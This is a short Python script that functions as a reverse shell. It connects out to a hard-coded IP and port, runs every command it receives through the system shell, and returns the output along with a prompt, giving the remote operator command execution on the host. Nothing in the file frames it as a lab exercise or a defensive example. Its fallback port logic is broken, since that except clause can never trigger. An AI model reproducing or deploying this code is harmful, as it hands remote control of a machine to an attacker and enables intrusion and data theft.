import socket
import sys
import os
import subprocess

def receive(s):
    while True:
            cmd_bytes = s.recv(4096)
            cmd = cmd_bytes.decode("utf-8")
            if cmd.startswith("cd "):
                os.chdir(cmd[3:])
                s.send(b"$: ")
                continue
            if len(cmd) > 0:
                process = subprocess.run(cmd, shell=True, capture_output=True)
                data = process.stdout + process.stderr
                s.sendall(data + b"$: ")
            

def connect(address):
    try:
        s = socket.socket()
        s.connect(address)
        print(f"connected on {address}")
    except socket.error as e:
        print(e.__cause__)
        s.close()
        sys.exit()
    receive(s)
    
if __name__ == "__main__":
    try:
        host = "192.168.1.7"
        port = 1234
    except socket.error as e:
        if e.errno == 98:
            host = "127.0.0.1"
            port = 4444
    connect((host, port))
